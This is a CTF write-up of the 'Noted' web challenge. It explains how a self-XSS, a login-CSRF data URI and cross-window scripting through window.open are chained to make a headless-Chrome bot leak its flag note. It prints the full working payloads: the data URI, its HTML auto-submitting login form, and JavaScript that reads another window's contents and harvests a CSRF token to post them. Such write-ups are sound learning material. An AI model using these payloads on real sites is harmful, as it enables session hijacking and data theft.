#	Noted - Web - 500 Points

Noted was the second to last challenge in the web category worth 500 points, and the consensus on the Pico discord was that this is the point where the difficulty jumped up significantly compared to previous challenges.


Personally, I found this to be the most interesting challenge of the whole event, learned a lot from it, and found the solution to be very satisfying. 

#### TL;DR

1. Report a data URI which would open a separate window containing the bot's /notes page and flag, and log the bot into our account from the first window.
2. Trigger XSS from our page to bypass CORS and CSRF, making the bot create a note on our page with the contents of previously opened window.

### Introduction

This was a whitebox challenge, with the source code available to us, and the application itself was a very barebones note taking app. 

It's functionality was that a user could register, login, write/delete notes which were rendered on the user's homepage, or report a link. It didn't actually say who it the link was being reported to, but typically report functionality is used in CTFs in cases of client-side attacks. 

A quick test of the note functionality showed that the app didn't do any sanitisation of user supplied input, but it did use CSRF tokens on the form used to submit our notes.

Looking at the source code we could see that the application used Puppeteer - a headless chrome package - which is very commonly used in XSS challenges. Each time you submitted a link to the bot, it would create a new account using crypto.randomBytes(16) for both username and password, and then create a note which would contain the flag. It would then open an about:blank page, and vist the link we reported.

My first instinct was to attempt exfiltrate the bot's cookies/session, however the challenge description said that the bot didn't have internet access - each new instance of Puppeteer would actually point to http://0.0.0.0:8080 when creating that flag note. Later we found out that the challenge was altered and the bot was given internet access, however it did not affect our solution.

Exfiltrating the bot's cookies also didn't make sense because there was no publicly shared functionality on the app, and any kind of XSS attempt would have reset the bot's cookies. 

The first piece of the puzzle was the self XSS on the user page - the lack of sanitisation meant that we could execute any javascript we wanted in the context of the main app's domain. But we couldn't simply force the bot to self XSS by creating a new note on the bot's page containing an XSS payload, as we still had to bypass CSRF protection. 

We knew that bypassing CSRF through our self XSS was as simple as fetching /new, extracting the token from the response and attaching it to our post request, so we just had to find a way to have the bot perform a self XSS with our payload - meaning we would need to log the bot into our account, while still keeping the data from the bot's page available to us.



###	iframes are weird.

At this point we had enough information to try and piece everything together, and we had a feeling that there would be some kind of cross-frame scripting involved. 

While browsers enforce CORS and SOP policies preventing iframes from different domains from sharing any information, iframes from the same domain are free to talk to each other - even when nested inside each other. Meaning if you have a page with 2 iframes from the same domain embedded in it, iframe 1 is free to reach up through its' parent into iframe 2. 

But that behaviour also applies to javascript's window.open() function. If you pass a second parameter into window.open(), you can use that window object later with the second parameter acting as a name/variable for that window. Using our self XSS we were free to reach up from the app domain into a previously opened window.open() object and access anything on that page.

### Exploit

So piecing everything together:

1. Post a note on our page containing the main payload, which would be the last payload to be triggered in the chain. It would fetch a CSRF token and create a new note on our page.
2. The link we would report to the bot would be a data URI, containing a minified bare bones html page with a form and some javascript. The form had our username and passord filled in as the value attributes of the form inputs, but before submitting the form it would first open a new window pointing to /notes - which would have the bot's notes/flag on it.
3. The form would then be submitted, making a post request to /login, and redirecting to our page.
4. The bot would be redirected to our page, trigering the main payload which would reach back up to the previously opened window object and leaving a note on our page with the contents of that page, and the flag itself - bypassing CSRF protection in the process. 

So these were our final payloads:

> Data URI:

data:text/html;charset=utf-8,%3Chtml%3E%20%3Cbody%3E%20%3Cform%20action%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Flogin%22%20id%3D%22f%22%20method%3D%22POST%22%3E%20%3Cinput%20name%3D%22username%22%20value%3D%22a%22%3E%20%3Cinput%20name%3D%22password%22%20value%3D%22a%22%3E%20%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%20%3C%2Fform%3E%20%3C%2Fbody%3E%20%3Cscript%3Ewindow.open(%22http%3A%2F%2F0.0.0.0%3A8080%2Fnotes%22%2C%20%22w%22)%3B%20f.submit()%3C%2Fscript%3E%3C%2Fhtml%3E



> Contents of the initial data URI payload:

	<html>
	    <body>
	        <form action="http://0.0.0.0:8080/login" id="f" method="POST">
	            <input name="username" value="a">
	            <input name="password" value="a">
	            <input type="submit" value="Submit">
	        </form>
	    </body>
	    <script> 
	    window.open("http://0.0.0.0:8080/notes", "w");
	    f.submit();
	    </script>
	</html>



> Contents of the payload from our page:

	let fW = window.open('', 'w'); 
    let flag = fW.document.documentElement.innerText;
    let y = new XMLHttpRequest()
    y.onreadystatechange = function() {
    if (y.readyState == 4) {
        parser = new DOMParser();
        let g = parser.parseFromString(y.responseText, "text/html")
        let s = g.getElementsByName('_csrf')[0].value
        fetch('http://0.0.0.0:8080/new', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                _csrf: s,
                title: 'Hello',
                content: flag,
            }),
    })
    }
    };
    y.open("GET", "http://0.0.0.0:8080/new", true);
    y.send();


So finally refreshing our page a few seconds after submitting our URL, our page had a new note on it containing the flag.

This was a very fun and satisfying challenge, huge thanks to Pico and the challenge creators!